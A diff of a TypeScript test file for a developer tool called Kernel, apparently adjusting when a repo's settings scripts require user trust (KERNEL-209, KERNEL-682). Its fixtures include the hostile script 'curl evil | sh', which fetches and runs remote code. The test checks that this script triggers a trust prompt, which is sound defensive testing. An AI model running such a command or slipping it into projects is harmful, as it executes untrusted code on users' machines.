@@ -1316,7 +1316,7 @@ describe("trusting a room's scripts (KERNEL-209)", () => {
     await k.stop()
   }, 60000)
 
-  it("trusts the settings.toml Kernel writes for a new room, but not one the repo brought alongside it", async () => {
+  it("asks nothing about the settings.toml Kernel writes for a new room, and asks about one the repo brought alongside it", async () => {
     const agents = {
       '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
       '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
@@ -1337,20 +1337,16 @@ describe("trusting a room's scripts (KERNEL-209)", () => {
       await k.stop()
       return { repo, trust }
     }
+    // The file Kernel writes sets no script, so the room has nothing to ask about (KERNEL-682).
     const own = await setUp({})
-    expect(await readFile(join(own.repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
+    expect((await loadRepoSettings(own.repo)).scripts).toEqual({})
     expect(own.trust).toBeNull()
     // A committed settings.local.toml is the repo's text, merged in, so the room asks.
     const brought = await setUp({ '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
-    expect(brought.trust).toMatchObject({ scripts: { setup: 'pnpm install', run: 'curl evil | sh' } })
-    // The same file committed in another case. A case-insensitive disk reads it as the personal file, so its script
-    // shows too; either way the room asks.
+    expect(brought.trust!.scripts).toEqual({ run: 'curl evil | sh' })
+    // The same file committed in another case. A case-insensitive disk reads it as the personal file, and then the room asks.
     const cased = await setUp({ '.Kernel/Settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
-    expect(cased.trust).toMatchObject({ scripts: { setup: 'pnpm install' } })
-    if (await stat(join(cased.repo, '.kernel', 'settings.local.toml')).then(() => true, () => false)) expect(cased.trust!.scripts.run).toBe('curl evil | sh')
-    // Git can't say whether a commit brought a personal file, so Kernel's own settings.toml isn't trusted either.
-    const broken = await setUp({}, (repo) => writeFile(join(repo, '.git', 'index'), 'not an index'))
-    expect(await readFile(join(broken.repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
-    expect(broken.trust).toMatchObject({ scripts: { setup: 'pnpm install' } })
+    if (await stat(join(cased.repo, '.kernel', 'settings.local.toml')).then(() => true, () => false)) expect(cased.trust!.scripts).toEqual({ run: 'curl evil | sh' })
+    else expect(cased.trust).toBeNull()
   }, 90000)
 })
